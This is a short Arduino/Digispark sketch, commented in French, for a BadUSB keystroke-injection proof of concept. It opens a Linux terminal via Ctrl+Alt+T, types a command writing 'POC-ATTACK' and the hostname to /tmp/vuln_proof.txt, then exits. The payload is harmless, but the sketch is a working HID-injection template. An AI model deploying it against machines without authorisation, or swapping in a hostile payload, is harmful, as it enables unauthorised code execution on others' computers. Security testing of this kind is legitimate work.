#include "DigiKeyboard.h"

void setup() {
  // Vide
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Ouvre un terminal (Raccourci clavier classique Linux : CTRL+ALT+T)
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // Payload : Crée un fichier de preuve et ferme le terminal
  DigiKeyboard.print("echo 'POC-ATTACK: ' $(hostname) > /tmp/vuln_proof.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){ /* Stop */ }
}